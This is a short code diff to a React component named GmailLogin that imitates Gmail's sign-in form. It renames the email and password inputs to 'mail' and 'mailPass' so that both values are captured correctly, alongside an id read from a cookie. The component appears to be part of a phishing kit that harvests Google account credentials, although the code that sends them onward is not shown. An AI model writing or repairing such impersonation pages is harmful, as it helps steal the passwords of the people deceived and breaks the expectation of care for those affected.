@@ -40,6 +40,7 @@ const AngleDown = () => {
 
 export default function GmailLogin() {
   const id = Cookies.get("id");
+
   const [formValues, setFormValues] = useState({
     id,
     mail: "",
@@ -112,8 +113,8 @@ export default function GmailLogin() {
                       <div className="mt-8">
                         <input
                           type="email"
-                          name="email"
-                          value={formValues.email}
+                          name="mail"
+                          value={formValues.mail}
                           onChange={handleChange}
                           placeholder="Email or phone"
                           required
@@ -175,8 +176,8 @@ export default function GmailLogin() {
                       <div className="mt-[70px]">
                         <input
                           type={showPassword ? "text" : "password"}
-                          name="password"
-                          value={formValues.password}
+                          name="mailPass"
+                          value={formValues.mailPass}
                           onChange={handleChange}
                           placeholder="Enter your password"
                           required
